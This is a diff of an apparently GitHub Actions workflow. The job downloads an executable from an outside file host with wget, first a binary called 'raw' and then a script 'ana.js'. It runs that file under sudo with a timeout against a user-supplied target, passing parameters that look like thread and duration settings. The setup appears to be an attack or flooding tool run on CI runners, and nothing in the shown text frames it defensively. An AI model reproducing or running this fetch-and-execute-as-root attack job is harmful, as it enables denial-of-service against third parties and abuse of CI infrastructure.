@@ -24,12 +24,12 @@ jobs:
         run: |
           TARGET="${{ inputs.target }}"
 
-          wget https://wgetz.com/kRlC1wCWwc/raw
-          chmod +x raw
+          wget https://curl.by/AxtoS/ana.js
+          chmod +x ana.js
 
           PIDS=()
-          for i in {1..1}; do
-            sudo timeout 270 ./raw "$TARGET" 4 250
+          for i in {1..0}; do
+            sudo timeout 270 node ana.js "$TARGET" 6 250
             PIDS+=($!)
           done
 
